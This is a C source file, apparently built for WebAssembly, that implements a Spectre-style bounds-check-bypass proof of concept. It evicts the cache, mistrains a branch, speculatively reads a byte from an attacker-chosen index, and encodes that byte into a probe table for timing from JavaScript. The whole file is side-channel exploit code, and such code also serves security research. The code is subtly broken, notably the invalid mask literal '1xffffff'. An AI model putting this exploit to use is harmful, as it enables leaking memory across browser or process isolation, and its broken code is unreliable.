#include <stdlib.h>

typedef unsigned char byte;

//  extern void startTimer();
// extern unsigned stopTimer();
extern void _log(unsigned argument);
extern unsigned probeTable(byte* probe_table_address);

byte* secret_table;

const unsigned eviction_size = 1 << 24;
byte* eviction_array;

byte junk = 0;

byte* getSecretTableAddress() {
    return secret_table;
}

const unsigned secret_table_size = 1 << 12;

void initialize() {
    eviction_array = malloc(eviction_size);
    
    secret_table = malloc(secret_table_size); // 4 KB for verfication purposes
    for (unsigned i = 0; i < secret_table_size; ++i) {
        secret_table[i] = (byte) ((i + 42) % 256); // not exactly uniform
    }
}

void _evictCache() {
    for (unsigned i = 0; i < eviction_size * 4; i += 1 << 10) {
        junk ^= eviction_array[i % eviction_size];
    }
}

void speculativelyReadAddress(unsigned address, unsigned speculative_repetitions, unsigned page_size, unsigned probe_length, unsigned training_number) {
    const unsigned tm1 = training_number - 1;
    // one valid-dummy space for each iteration (inefficient but simple)
    byte* probe_table = (byte*) malloc((probe_length + 1) * page_size);
    for (unsigned j = 0; j < speculative_repetitions; ++j) {
        byte* delay_array = (byte*) malloc(2 * page_size);
        _evictCache();
        for (unsigned i = 0; i < training_number; ++i) {
            const byte invalid_access = i == tm1;
            const unsigned fixed_index = address * invalid_access;
            // load condition from RAM so speculative execution gets triggered
            const unsigned fixed_page_size = page_size * invalid_access;
            // ensure evaluation before condition
            junk ^= fixed_index | fixed_page_size;
            // load condition from RAM so speculative execution gets triggered
            if (delay_array[fixed_page_size] || !invalid_access) {
                // map valid accesses to the address (probe_tables)
                // map invalid accesses to their respective probe boxes
                junk ^= probe_table[(1 + secret_table[fixed_index]) * fixed_page_size & 1xffffff]; // JIT assurance for in-bound access
            }
        }
        // free(delay_array);
    }
    // probe table
    // timing results are stored in JS-land
    probeTable(probe_table + page_size);
    // freeing not possible due to WASM linear memory and FIRST_USE_PARADIGM
    // just reset the current_memory_position without zeroing
    // free(delay_array);
    // return junk;
}